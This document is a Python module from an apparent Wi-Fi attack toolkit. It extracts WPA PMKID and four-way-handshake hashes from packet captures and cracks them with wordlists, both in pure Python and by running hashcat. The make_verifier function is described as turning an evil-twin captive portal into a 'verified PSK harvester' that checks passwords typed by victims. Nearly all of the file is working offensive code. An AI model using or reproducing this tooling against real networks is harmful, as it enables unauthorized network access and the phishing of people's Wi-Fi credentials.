#!/usr/bin/env python3
"""
modules/pmkid.py — PMKID / EAPOL hash intelligence + cracking
──────────────────────────────────────────────────────────────
Two jobs:

1. **Hash intelligence (pure, testable).** Parse the hashcat 22000 lines that
   ``hcxpcapngtool`` produces so the tool can tell the operator *exactly* what
   was captured — which networks, PMKID vs EAPOL, and whether it is crackable —
   **before** spending hours on a wordlist. No other tool in this class reports
   its capture with this precision.

2. **Cracking (reliable retrieval).** Convert a ``.pcapng`` to 22000, check the
   potfile for an instant win, run hashcat mode 22000, and read the recovered
   password back the robust way (``hashcat --show``) instead of guessing where
   the potfile lives.

The 22000 line format (``*``-separated)::

    WPA*01*<PMKID>*<AP_MAC>*<STA_MAC>*<ESSID_hex>***<msgpair>     # 01 = PMKID
    WPA*02*<MIC>*<AP_MAC>*<STA_MAC>*<ESSID_hex>*<anonce>*<eapol>* # 02 = EAPOL
"""
from __future__ import annotations

import logging
import os
import shutil
import subprocess
from datetime import datetime

logger = logging.getLogger(__name__)

TYPE_PMKID = "01"
TYPE_EAPOL = "02"
_TYPE_NAMES = {TYPE_PMKID: "PMKID", TYPE_EAPOL: "EAPOL"}


# ══════════════════════════════════════════════════════════════════════════════
# Pure parsers  (no subprocess, fully unit-tested)
# ══════════════════════════════════════════════════════════════════════════════

def mac_from_hex(h: str) -> str:
    """``"aabbccddeeff"`` → ``"AA:BB:CC:DD:EE:FF"``; ``""`` on malformed input."""
    h = (h or "").strip().lower()
    if len(h) != 12 or any(c not in "0123456789abcdef" for c in h):
        return ""
    return ":".join(h[i:i + 2] for i in range(0, 12, 2)).upper()


def essid_from_hex(h: str) -> str:
    """Decode a hex-encoded ESSID to text (``errors='replace'``). ``""`` if invalid."""
    h = (h or "").strip()
    if not h or len(h) % 2 != 0:
        return ""
    try:
        return bytes.fromhex(h).decode("utf-8", errors="replace")
    except ValueError:
        return ""


def parse_hc22000_line(line: str) -> dict | None:
    """
    Parse one hashcat-22000 line into a structured record, or ``None`` if the
    line is not a valid WPA hash.

    Returns ``{type, type_name, key, bssid, station, essid, raw}`` where ``key``
    is the PMKID (type 01) or MIC (type 02).
    """
    if not line:
        return None
    parts = line.strip().split("*")
    if len(parts) < 6 or parts[0] != "WPA":
        return None
    typ = parts[1]
    bssid = mac_from_hex(parts[3])
    if not bssid:
        return None
    return {
        "type":      typ,
        "type_name": _TYPE_NAMES.get(typ, f"type-{typ}"),
        "key":       parts[2],
        "bssid":     bssid,
        "station":   mac_from_hex(parts[4]),
        "essid":     essid_from_hex(parts[5]),
        "raw":       line.strip(),
    }


def summarize_hash_lines(lines) -> dict:
    """
    Aggregate 22000 lines into a capture summary.

    Returns::

        {
          "total":  int,           # valid hashes parsed
          "pmkid":  int,           # of which PMKID (type 01)
          "eapol":  int,           # of which EAPOL (type 02)
          "networks": { bssid: {"ssid": str, "pmkid": int, "eapol": int} },
          "crackable": bool,       # total > 0
        }
    """
    networks: dict[str, dict] = {}
    pmkid = eapol = 0
    for line in lines:
        rec = parse_hc22000_line(line)
        if not rec:
            continue
        net = networks.setdefault(
            rec["bssid"], {"ssid": rec["essid"], "pmkid": 0, "eapol": 0}
        )
        if rec["essid"] and not net["ssid"]:
            net["ssid"] = rec["essid"]
        if rec["type"] == TYPE_PMKID:
            net["pmkid"] += 1
            pmkid += 1
        elif rec["type"] == TYPE_EAPOL:
            net["eapol"] += 1
            eapol += 1
    total = pmkid + eapol
    return {
        "total": total,
        "pmkid": pmkid,
        "eapol": eapol,
        "networks": networks,
        "crackable": total > 0,
    }


def summarize_hash_file(hash_file: str) -> dict:
    """Read a 22000 file and summarise it (empty summary if unreadable)."""
    try:
        with open(hash_file, errors="replace") as fh:
            return summarize_hash_lines(fh)
    except OSError:
        return summarize_hash_lines([])


def describe_summary(summary: dict) -> str:
    """One-line human summary, e.g. ``"2 PMKID + 1 EAPOL across 2 network(s)"``."""
    if not summary.get("total"):
        return "no crackable PMKID/EAPOL hashes"
    bits = []
    if summary["pmkid"]:
        bits.append(f"{summary['pmkid']} PMKID")
    if summary["eapol"]:
        bits.append(f"{summary['eapol']} EAPOL")
    n = len(summary.get("networks", {}))
    return f"{' + '.join(bits)} across {n} network(s)"


# ══════════════════════════════════════════════════════════════════════════════
# Extraction  (hcxpcapngtool)
# ══════════════════════════════════════════════════════════════════════════════

def extract_pmkid_hashes(pcapng_file: str, out_dir: str | None = None) -> str | None:
    """
    Run ``hcxpcapngtool`` on *pcapng_file* and return the path to the resulting
    22000 hash file, or ``None`` on failure. Prints a precise summary of what
    was captured.
    """
    if not shutil.which("hcxpcapngtool"):
        logger.warning("hcxpcapngtool not found — install hcxtools.")
        print("[-] hcxpcapngtool not found — install hcxtools.")
        return None

    if not os.path.isfile(pcapng_file):
        print(f"[-] Capture file not found: {pcapng_file}")
        return None

    out_dir = out_dir or os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "captures"
    )
    os.makedirs(out_dir, exist_ok=True)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    hash_file = os.path.join(out_dir, f"pmkid_{ts}.hc22000")

    cmd = ["hcxpcapngtool", "-o", hash_file, pcapng_file]
    print(f"[*] Extracting PMKID/EAPOL hashes → {hash_file}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        print("[-] hcxpcapngtool timed out.")
        return None
    except OSError as exc:
        print(f"[-] Error: {exc}")
        return None

    if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
        summary = summarize_hash_file(hash_file)
        print(f"[+] {describe_summary(summary)} → {hash_file}")
        for bssid, net in summary["networks"].items():
            tags = []
            if net["pmkid"]:
                tags.append(f"{net['pmkid']}×PMKID")
            if net["eapol"]:
                tags.append(f"{net['eapol']}×EAPOL")
            print(f"      {bssid}  {net['ssid'] or '<hidden>'}  ({', '.join(tags)})")
        return hash_file

    print("[-] hcxpcapngtool produced an empty or no output file.")
    if result.stderr:
        print(result.stderr.strip())
    return None


# ══════════════════════════════════════════════════════════════════════════════
# Cracking  (hashcat mode 22000) with reliable retrieval
# ══════════════════════════════════════════════════════════════════════════════

def parse_hashcat_show(text: str) -> dict:
    """
    Parse ``hashcat --show`` output into ``{bssid: password}``.

    Each line is ``<22000-hash>:<password>``. The 22000 hash never contains a
    ``:`` so a single split on the first colon is exact even when the password
    itself contains colons.
    """
    out: dict[str, str] = {}
    for line in text.splitlines():
        line = line.rstrip("\n")
        if ":" not in line or not line.startswith("WPA*"):
            continue
        hash_part, password = line.split(":", 1)
        rec = parse_hc22000_line(hash_part)
        key = rec["bssid"] if rec else hash_part
        out[key] = password
    return out


def already_cracked(hash_file: str) -> dict:
    """
    Ask hashcat which hashes in *hash_file* are already in the potfile —
    an instant win that skips a pointless wordlist run. ``{bssid: password}``.
    """
    if not shutil.which("hashcat") or not os.path.isfile(hash_file):
        return {}
    try:
        res = subprocess.run(
            ["hashcat", "-m", "22000", hash_file, "--show"],
            capture_output=True, text=True, timeout=60,
        )
        return parse_hashcat_show(res.stdout)
    except (subprocess.TimeoutExpired, OSError):
        return {}


def parse_hc22000_eapol(line: str) -> dict | None:
    """
    Parse a type-02 (EAPOL / 4-way handshake) 22000 line into verifiable fields.

    ``WPA*02*<MIC>*<AP>*<STA>*<ESSID>*<ANONCE>*<EAPOL>*<msgpair>`` — the ANonce is
    a field, the SNonce and key-descriptor version are read out of the stored
    EAPOL-Key frame. Returns ``None`` for anything that is not a valid 02 line.
    """
    from modules import wpacrypto
    if not line:
        return None
    parts = line.strip().split("*")
    if len(parts) < 8 or parts[0] != "WPA" or parts[1] != TYPE_EAPOL:
        return None
    bssid = mac_from_hex(parts[3])
    if not bssid:
        return None
    try:
        eapol = bytes.fromhex(parts[7])
    except ValueError:
        return None
    return {
        "type":        TYPE_EAPOL,
        "type_name":   "EAPOL",
        "bssid":       bssid,
        "station":     mac_from_hex(parts[4]),
        "essid":       essid_from_hex(parts[5]),
        "mic":         parts[2],
        "anonce":      parts[6],
        "eapol":       eapol,
        "snonce":      wpacrypto.snonce_from_eapol(eapol).hex(),
        "key_version": wpacrypto.key_version_from_eapol(eapol),
        "raw":         line.strip(),
    }


def load_hc22000_records(hash_file: str) -> list[dict]:
    """All verifiable records (PMKID *and* EAPOL) from a 22000 file."""
    records: list[dict] = []
    try:
        with open(hash_file, errors="replace") as fh:
            for line in fh:
                parts = line.strip().split("*")
                if len(parts) < 2 or parts[0] != "WPA":
                    continue
                if parts[1] == TYPE_PMKID:
                    r = parse_hc22000_line(line)
                    if r:
                        records.append(r)
                elif parts[1] == TYPE_EAPOL:
                    r = parse_hc22000_eapol(line)
                    if r:
                        records.append(r)
    except OSError:
        return []
    return records


def _record_matches(rec: dict, password: str, pmk_cache: dict) -> bool:
    """True if *password* reproduces this PMKID or EAPOL MIC record."""
    from modules import wpacrypto
    essid = rec["essid"]
    if essid not in pmk_cache:
        pmk_cache[essid] = wpacrypto.pmk(password, essid)
    pmk = pmk_cache[essid]

    if rec["type"] == TYPE_PMKID:
        got = wpacrypto.compute_pmkid(pmk, rec["bssid"], rec["station"])
        try:
            return got == bytes.fromhex(rec["key"])
        except ValueError:
            return False

    if rec["type"] == TYPE_EAPOL:
        p = wpacrypto.ptk(pmk, rec["bssid"], rec["station"],
                          rec["anonce"], rec["snonce"])
        frame0 = wpacrypto.zero_mic(rec["eapol"])
        mic = wpacrypto.compute_mic(wpacrypto.kck(p), frame0, rec["key_version"])
        try:
            return mic == bytes.fromhex(rec["mic"])
        except ValueError:
            return False
    return False


def crack_hc22000_pure(
    hash_file: str,
    wordlist_file: str,
    progress=None,
) -> tuple[str, str] | None:
    """
    Crack a captured PMKID **or 4-way handshake** with no external tools — pure
    Python, using the 22000 parsers here plus the standards crypto in
    ``wpacrypto``. Iterates the wordlist once, testing every record per candidate
    (PMK cached per ESSID). Returns ``(bssid, password)`` on success, else None.
    """
    records = load_hc22000_records(hash_file)
    if not records:
        return None
    n = 0
    try:
        with open(wordlist_file, errors="replace") as wl:
            for line in wl:
                cand = line.rstrip("\r\n")
                if not (8 <= len(cand) <= 63):
                    continue
                n += 1
                if progress and n % 500 == 0:
                    progress(n)
                cache: dict[str, bytes] = {}
                for rec in records:
                    if _record_matches(rec, cand, cache):
                        return rec["bssid"], cand
    except OSError:
        return None
    return None


def crack_pmkid_pure(hash_file: str, wordlist_file: str, progress=None):
    """Back-compat alias — now cracks PMKID *and* EAPOL (see crack_hc22000_pure)."""
    return crack_hc22000_pure(hash_file, wordlist_file, progress)


# ══════════════════════════════════════════════════════════════════════════════
# Raw .cap handshake extraction  (no hcxpcapngtool required)
# ══════════════════════════════════════════════════════════════════════════════

def _norm_mac(m: str) -> str:
    m = (m or "").strip()
    return m.upper() if ":" in m else mac_from_hex(m)


def _assemble_eapol_record(essid: str, ap_mac: str, sta_mac: str,
                           m1_eapol: bytes, m2_eapol: bytes) -> dict | None:
    """
    Build a verifiable EAPOL record from the raw M1 and M2 EAPOL-Key frames.

    ANonce comes from M1 (offset 17), SNonce + MIC from M2, and the MIC is
    recomputed over the MIC-zeroed M2 frame. Pure — no scapy, fully testable.
    """
    from modules import wpacrypto
    if len(m1_eapol) < 49 or len(m2_eapol) < 97:
        return None
    return {
        "type":        TYPE_EAPOL,
        "type_name":   "EAPOL",
        "bssid":       _norm_mac(ap_mac),
        "station":     _norm_mac(sta_mac),
        "essid":       essid or "",
        "anonce":      m1_eapol[17:49].hex(),
        "snonce":      m2_eapol[17:49].hex(),
        "eapol":       wpacrypto.zero_mic(m2_eapol),
        "mic":         m2_eapol[81:97].hex(),
        "key_version": wpacrypto.key_version_from_eapol(m2_eapol),
        "raw":         "",
    }


def extract_handshakes_from_cap(cap_file: str, bssid: str | None = None,
                                ssid: str | None = None) -> list[dict]:
    """
    Extract crackable M1+M2 handshake records from a raw ``.cap``/``.pcap`` via
    scapy — no hcxpcapngtool needed. Returns [] if scapy is unavailable or the
    file holds no complete pair. ESSID is read from beacons/probe-responses;
    pass *ssid* to override when the capture has no beacon.
    """
    try:
        from scapy.all import rdpcap
        from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp
        from scapy.layers.eap import EAPOL

        from modules.eapol_monitor import classify_eapol
    except Exception:
        return []
    try:
        packets = rdpcap(cap_file)
    except Exception:
        return []

    want = bssid.upper() if bssid else None
    essids: dict[str, str] = {}
    m1_frames: dict[tuple, bytes] = {}
    records: list[dict] = []
    seen: set[tuple] = set()

    for pkt in packets:
        if not pkt.haslayer(Dot11):
            continue
        d = pkt.getlayer(Dot11)

        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            ap = (d.addr2 or d.addr3 or "").upper()
            elt = pkt.getlayer(Dot11Elt)
            while isinstance(elt, Dot11Elt):
                if elt.ID == 0 and elt.info:
                    essids[ap] = elt.info.decode(errors="replace")
                    break
                elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
            continue

        if not pkt.haslayer(EAPOL):
            continue
        eapol = bytes(pkt.getlayer(EAPOL))
        if len(eapol) < 49:
            continue
        key_info = int.from_bytes(eapol[5:7], "big")
        msg = classify_eapol(key_info)
        replay = eapol[9:17]
        a1 = (d.addr1 or "").upper()
        a2 = (d.addr2 or "").upper()

        if msg == 1:                       # M1: AP → STA
            m1_frames[(a2, a1, replay)] = eapol
        elif msg == 2 and len(eapol) >= 97:  # M2: STA → AP
            ap, sta = a1, a2
            if want and ap != want:
                continue
            m1 = m1_frames.get((ap, sta, replay))
            if not m1:                     # fall back: any M1 for this AP/STA
                for (a, s, _r), v in m1_frames.items():
                    if a == ap and s == sta:
                        m1 = v
                        break
            if m1 and (ap, sta) not in seen:
                rec = _assemble_eapol_record(
                    essids.get(ap, ssid or ""), ap, sta, m1, eapol)
                if rec:
                    seen.add((ap, sta))
                    records.append(rec)
    return records


def crack_cap_pure(cap_file: str, wordlist_file: str, bssid: str | None = None,
                   ssid: str | None = None, progress=None) -> tuple[str, str] | None:
    """
    Crack a raw ``.cap`` handshake with **no external tools at all** — not even
    hcxpcapngtool. Extracts M1/M2 via scapy, then runs the wordlist through the
    pure crypto. Returns ``(bssid, password)`` or ``None``.
    """
    records = extract_handshakes_from_cap(cap_file, bssid, ssid)
    if not records:
        return None
    n = 0
    try:
        with open(wordlist_file, errors="replace") as wl:
            for line in wl:
                cand = line.rstrip("\r\n")
                if not (8 <= len(cand) <= 63):
                    continue
                n += 1
                if progress and n % 500 == 0:
                    progress(n)
                cache: dict[str, bytes] = {}
                for rec in records:
                    if _record_matches(rec, cand, cache):
                        return rec["bssid"], cand
    except OSError:
        return None
    return None


def make_verifier(hash_file: str):
    """
    Build a ``verify(password) -> bool`` closure from every PMKID **and EAPOL**
    record in *hash_file*, or ``None`` if it has none. This is what turns an
    evil-twin captive portal from a blind credential logger into a **verified
    PSK harvester**: a password a victim types is confirmed against the real
    capture in microseconds, so "wrong password, try again" is genuine and a
    success means the true key was captured. Now works for a handshake-only
    capture, not just PMKID.
    """
    records = load_hc22000_records(hash_file)
    if not records:
        return None

    def verify(password: str) -> bool:
        if not password or not (8 <= len(password) <= 63):
            return False
        cache: dict[str, bytes] = {}
        return any(_record_matches(rec, password, cache) for rec in records)

    return verify


def make_pmkid_verifier(hash_file: str):
    """Back-compat alias for :func:`make_verifier` (now PMKID + EAPOL)."""
    return make_verifier(hash_file)


def crack_pmkid_hashcat(
    hash_file: str,
    wordlist: str,
    rules: str | None = None,
    timeout: int = 3600,
) -> str | None:
    """
    Crack *hash_file* (mode 22000) with *wordlist*. Returns the recovered
    password, or ``None``.

    Robust flow: check the potfile first (instant win), run hashcat, then read
    the result back with ``--show`` — no fragile potfile-path guessing.
    """
    if not shutil.which("hashcat"):
        print("[-] hashcat not found.")
        return None
    if not os.path.isfile(hash_file):
        print(f"[-] Hash file not found: {hash_file}")
        return None

    pre = already_cracked(hash_file)
    if pre:
        pw = next(iter(pre.values()))
        print(f"[+] Already in potfile — instant recovery: {pw}")
        return pw

    cmd = ["hashcat", "-m", "22000", hash_file, wordlist,
           "--status", "--status-timer", "10"]
    if rules:
        cmd += ["-r", rules]

    print(f"[*] hashcat mode 22000  |  wordlist: {os.path.basename(wordlist)}")
    try:
        subprocess.run(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        print("[-] hashcat timed out.")
    except OSError as exc:
        print(f"[-] hashcat error: {exc}")

    cracked = already_cracked(hash_file)
    if cracked:
        pw = next(iter(cracked.values()))
        print(f"[+] Password recovered: {pw}")
        return pw
    print("[-] No password recovered from this wordlist.")
    return None
